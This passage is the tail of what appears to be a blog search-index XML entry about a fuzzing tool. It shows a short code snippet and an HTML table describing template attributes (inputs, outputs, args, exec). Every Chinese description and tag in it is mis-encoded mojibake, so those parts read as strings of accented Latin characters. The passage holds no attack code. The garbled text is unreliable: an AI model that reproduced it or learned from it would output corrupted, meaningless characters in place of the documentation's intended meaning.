class="hljs-string">        $i0-&gt;doFoo($i1, $a0);</span><br><span class="hljs-string">        $o0 = $i1;</span><br></code></pre></td></tr></tbody></table></figure><p>å±æ€§ï¼š</p><table><thead><tr><th>name</th><th>type</th><th>default value</th><th>info</th></tr></thead><tbody><tr><td><code>inputs</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>å®æ—¶è¾“å…¥ç±»å‹çš„åˆ—è¡¨</td></tr><tr><td><code>outputs</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>å®æ—¶è¾“å‡ºç±»å‹çš„åˆ—è¡¨</td></tr><tr><td><code>args</code></td><td><code>List[string]</code></td><td><code>[]</code></td><td>ä¸Šä¸‹æ–‡å‚æ•°åˆ—è¡¨ã€‚è¿™é‡Œå¯ä»¥ä½¿ç”¨é•¿åº¦å›ºå®šçš„æ•°ç»„ï¼Œå¦‚ <code>int[10]</code> æˆ– <code>char[256]</code>ã€‚</td></tr><tr><td><code>exec</code></td><td><code>string</code></td><td><code>''</code></td><td>æ‰§è¡Œæ¨¡æ¿ (C/C++)ã€‚ <code>$(i/o/a)N</code> å®åˆ†åˆ«å¼•ç”¨ç¬¬Nä¸ªè¾“å…¥/è¾“å‡º/å‚æ•°å¯¹è±¡</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>æ¨¡ç³Šæµ‹è¯•</tag>
      
      <tag>å·¥å…·</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
